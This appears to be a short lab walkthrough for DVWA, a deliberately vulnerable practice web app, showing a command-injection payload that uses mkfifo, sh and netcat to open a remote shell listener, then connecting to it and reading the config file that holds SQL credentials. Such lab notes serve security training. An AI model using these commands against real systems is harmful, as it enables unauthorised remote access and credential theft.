USING COMMAND INJECTION TO OBTAIN A REVERSE SHELL:

make sure dvwa security level is set to low
click on command injection
[ ; mkfifo /tmp/pipe; sh /tmp/pipe | nc -l 6666 > /tmp/pipe & ]
    ';': ends ping command
    "mkfifo /tmp/pipe;": makes a new first in first out file in /tmp/ called pipe, /tmp/pipe
1 = "sh /tmp/pipe": create a new shell which takes commands reads commands from /tmp/pipe
2 = "nc -l 6666 > /tmp/pipe": start netcat and set a listener on port 6666, redirect and write all incoming traffic to /tmp/pipe
        this is what allows the shell to accept remote commands
    "$1 | $2": unix pipe the output of "sh /tmp/pipe" to netcat, this is what lets the attacker see the output of their remote commands
    '&': run this command in the background so the website functionality is not disrupted

Once this has been submitted to the form we can connect from the remote machine

    $ nc <dvwa_ip> 6666

We should see nothing at this point

    whoami

This should either print "www-data" or "apache", signifying that we are in the server running DVWA


SQL EXPLORATION ONCE WE HAVE A REVERSE SHELL:

To find the sql username and password, cat the contents in /var/www/html/DVWA-master/config/config.inc.php
